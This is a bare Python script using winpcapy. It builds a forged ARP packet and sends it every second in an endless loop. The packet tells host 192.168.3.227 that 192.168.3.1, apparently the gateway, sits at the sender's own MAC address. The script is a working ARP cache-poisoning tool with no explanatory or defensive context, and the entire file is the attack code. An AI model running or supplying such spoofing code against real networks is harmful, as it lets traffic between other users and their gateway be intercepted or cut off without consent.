from winpcapy import *
from dumpy import *
import struct
import time

packet = (c_ubyte * 42)()

device = get_device()
    
adhandle = pcap_open_live(device.name, 65536, 1, 1000, errbuf)

#ethernet header
packet[0:6] = 0x90, 0x9f, 0x33, 0xec, 0xcc, 0x61

packet[6:12] = 0x90, 0x9f, 0x33, 0xeb, 0x3b, 0xa5

packet[12:14] = 0x8, 0x6

#arp header(request)
packet[14:16] = 0x00, 0x01

packet[16:18] = 0x8, 0x0

packet[18] = 0x6

packet[19] = 0x4

packet[20:22] = 0x0, 0x1

packet[22:28] = 0x90, 0x9f, 0x33, 0xeb, 0x3b, 0xa5

packet[28:32] = 192, 168, 3, 1

packet[32:38] = 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

packet[38:42] = 192, 168, 3, 227

while 1:
    time.sleep(1)
    pcap_sendpacket(adhandle, packet, 42)

pcap_close(adhandle)
